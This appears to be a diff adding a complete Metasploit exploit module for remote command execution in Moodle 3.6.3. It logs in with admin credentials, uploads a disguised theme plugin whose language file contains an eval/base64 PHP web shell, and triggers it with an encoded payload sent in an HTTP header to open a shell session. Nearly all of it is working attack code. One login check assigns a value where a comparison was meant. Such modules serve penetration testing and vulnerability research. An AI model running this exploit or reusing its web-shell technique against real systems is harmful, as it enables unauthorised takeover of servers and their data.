@@ -1,0 +1,223 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+ 
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "Moodle 3.6.3 - 'Install Plugin' Remote Command Execution",
+      'Description' => %q(
+        This module exploits a command execution vulnerability in Moodle 3.6.3.
+        An attacker can upload malicious file using the plugin installation area.
+        Plugins must be hosted accommodate "version.php" and "theme_{plugin name}.php" files.
+        After routine check, the moodle will accept the appropriate plugin file.
+        Plugin control can be bypassed and malicious code can be placed in the files contained in the plugin.
+        The module receives a shell session from the server by placing malicious code in the language file.
+
+        You must have an admin account to exploit this vulnerability.
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module @ehakkus
+        ],
+      'References' =>
+        [
+          ['URL', 'http://pentest.com.tr/exploits/Moodle-3-6-3-Install-Plugin-Remote-Command-Execution.html'],
+          ['URL', 'https://moodle.org']
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Apr 28 2019",
+      'DefaultTarget' => 0))
+ 
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base Moodle directory path", '/']),
+        OptString.new('USERNAME', [true, "Admin username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [false, "Admin password to authenticate with", 'admin'])
+      ]
+    )
+  end
+
+  def create_plugin_file
+    # There are syntax errors in creating zip file. So the payload was sent as base64.
+    plugin_file      = Rex::Zip::Archive.new
+    @header       = Rex::Text.rand_text_alpha_upper(4)
+    @plugin_name  = Rex::Text.rand_text_alpha_lower(7)
+
+    path = "#{@plugin_name}/version.php"
+    path2 = "#{@plugin_name}/lang/en/theme_#{@plugin_name}.php"
+    # "$plugin->version" and "$plugin->component" contents are required to accept Moodle plugin.
+    plugin_file.add_file(path, "<?php $plugin->version = 2018121704; $plugin->component = 'theme_#{@plugin_name}';")
+    plugin_file.add_file(path2, "<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>")
+    plugin_file.pack
+
+  end
+
+  def exec_code(cookie)
+    handler
+    # Base64 was encoded in "PHP". This process was sent as "HTTP headers".
+    send_request_cgi({
+      'method' => 'GET',
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, "theme", @plugin_name, "lang", "en", "theme_#{@plugin_name}.php"),
+      'raw_headers' => "#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\r\n"
+    })
+
+  end
+
+  def upload(cookie)
+    # The beginning of the adventure o_O
+    print_status("Plugin zip file is being created and loaded...")
+    res = send_request_cgi(
+      'method' => 'GET',
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, 'admin', 'tool', 'installaddon', 'index.php')
+    )
+
+    @sesskey = res.body.split('"sesskey":"')[1].split('"')[0] # fetch session info
+    @itemid = res.body.split('amp;itemid=')[1].split('&')[0] # fetch item for upload
+    @author = res.body.split('title="View profile">')[1].split('<')[0] # fetch admin account profile info
+    @clientid = res.body.split('client_id":"')[1].split('"')[0] # fetch client info
+    
+    # creating multipart data for the upload plugin file
+    pdata = Rex::MIME::Message.new
+    pdata.add_part(create_plugin_file, 'application/zip', nil, "form-data; name=\"repo_upload_file\"; filename=\"#{@plugin_name}.zip\"")
+    pdata.add_part('', nil, nil, 'form-data; name="title"')
+    pdata.add_part(@author, nil, nil, 'form-data; name="author"')
+    pdata.add_part('allrightsreserved', nil, nil, 'form-data; name="license"')
+    pdata.add_part(@itemid, nil, nil, 'form-data; name="itemid"')
+    pdata.add_part('.zip', nil, nil, 'form-data; name="accepted_types[]"')
+    pdata.add_part('4', nil, nil, 'form-data; name="repo_id"')
+    pdata.add_part('', nil, nil, 'form-data; name="p"')
+    pdata.add_part('', nil, nil, 'form-data; name="page"')
+    pdata.add_part('filepicker', nil, nil, 'form-data; name="env"')
+    pdata.add_part(@sesskey, nil, nil, 'form-data; name="sesskey"')
+    pdata.add_part(@clientid, nil, nil, 'form-data; name="client_id"')
+    pdata.add_part('-1', nil, nil, 'form-data; name="maxbytes"')
+    pdata.add_part('-1', nil, nil, 'form-data; name="areamaxbytes"')
+    pdata.add_part('1', nil, nil, 'form-data; name="ctx_id"')
+    pdata.add_part('/', nil, nil, 'form-data; name="savepath"')
+    data = pdata.to_s
+ 
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'ctype' => "multipart/form-data; boundary=#{pdata.bound}",
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, 'repository', 'repository_ajax.php?action=upload')     
+    })
+
+    if res.body =~ /draftfile.php/
+      print_good("Plugin #{@plugin_name}.zip file successfully uploaded to target!")
+      print_status("Attempting to integrate the plugin...")
+      @zipfile = res.body.split('draft\/')[1].split('\/')[0]
+      plugin_integration(cookie)
+    else
+      fail_with(Failure::NoAccess, "Something went wrong!")
+    end
+  end
+
+  def plugin_integration(cookie)
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'tool', 'installaddon', 'index.php'),
+      'cookie'   => cookie,
+      'vars_post' => {
+        'sesskey' => @sesskey,
+        '_qf__tool_installaddon_installfromzip_form' => '1',
+        'mform_showmore_id_general' => '0',
+        'mform_isexpanded_id_general' => '1',
+        'zipfile' => @zipfile,
+        'plugintype' => 'theme',
+        'rootdir' => '',
+        'submitbutton' => 'Install+plugin+from+the+ZIP+file'
+      }
+    )
+
+    if res.body =~ /installzipstorage/
+      print_good("Plugin successfully integrated!")
+      storage = res.body.split('installzipstorage=')[1].split('&')[0]
+
+      res = send_request_cgi(
+        'method' => 'POST',
+        'uri' => normalize_uri(target_uri.path, 'admin', 'tool', 'installaddon', 'index.php'),
+        'cookie'   => cookie,
+        'vars_post' => {
+          'installzipcomponent' => "theme_#{@plugin_name}",
+          'installzipstorage' => storage,
+          'installzipconfirm' => '1',
+          'sesskey' => @sesskey
+        }
+      )
+      exec_code(cookie)
+
+    else
+      fail_with(Failure::NoAccess, "Something went wrong!")
+    end
+  end
+ 
+  def login(uname, pass)
+    # 1st request to get MoodleSession and LoginToken
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'login', 'index.php')
+    )
+    cookie = res.get_cookies
+    token = res.body.split('logintoken" value="')[1].split('"')[0]
+
+    # 2nd request to login validation
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'login', 'index.php'),
+      'cookie'   => cookie,
+      'vars_post' => {
+        'anchor' => '',
+        'logintoken' => token,
+        'username' => uname,
+        'password' => pass
+      }
+    )
+
+    cookie = res.get_cookies
+    location = res.redirection.to_s
+    if res and res.code = 303 && location.include?('testsession')
+      return cookie     
+    end 
+
+    fail_with(Failure::NoAccess, "Authentication was unsuccessful with user: #{uname}")
+    return nil
+  end
+
+  def check 
+    # Basic check 
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'lib', 'upgrade.txt')
+    )
+
+    if res && res.code == 200 && res.body =~ /=== 3.7/
+      return Exploit::CheckCode::Safe
+    else
+      return Exploit::CheckCode::Appears
+    end 
+  end
+ 
+  def exploit
+    cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
+    print_good("Authentication was successful with user: #{datastore['USERNAME']}")
+    upload(cookie) # start the adventure
+  end
+##
+# The end of the adventure (o_O) // AkkuS
+##
+end
